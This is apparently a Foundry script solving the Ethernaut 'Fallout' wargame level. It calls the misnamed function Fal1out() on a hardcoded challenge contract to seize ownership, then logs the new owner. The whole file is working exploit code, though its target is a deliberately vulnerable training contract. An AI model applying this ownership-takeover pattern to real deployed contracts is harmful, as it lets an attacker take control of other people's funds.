// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Script, console} from "forge-std/Script.sol";

interface IFallout {
    function Fal1out() external payable;

    function owner() external view returns (address);
}

contract Level1Script is Script {
    IFallout target;

    function run() external {
        target = IFallout(0xFbA6C6DB93709183ca7F94AD06a8BaF6414e6B66);
        vm.startBroadcast();
        target.Fal1out();
        vm.stopBroadcast();

        address newOwner = IFallout(target).owner();
        console.log("Attack finished. New owner is:", newOwner);
    }
}
